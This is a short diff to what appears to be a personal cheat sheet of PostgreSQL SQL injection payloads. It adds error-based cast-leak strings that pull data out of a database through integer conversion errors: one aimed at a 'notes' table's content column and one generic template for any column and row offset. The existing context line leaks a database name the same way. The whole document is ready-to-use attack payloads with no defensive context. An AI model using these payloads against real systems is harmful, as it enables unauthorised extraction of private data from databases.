@@ -29,3 +29,10 @@ encoded
 
 #postgres database
 '; (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 0) AS integer))--
+
+#postgress cast leak
+'; SELECT 1 / CAST((SELECT content FROM notes LIMIT 1 OFFSET 0) AS INTEGER); --
+
+#how to leak from a column
+'; SELECT 1 / CAST((SELECT <column> FROM <table> LIMIT 1 OFFSET <n>) AS INTEGER); --
+
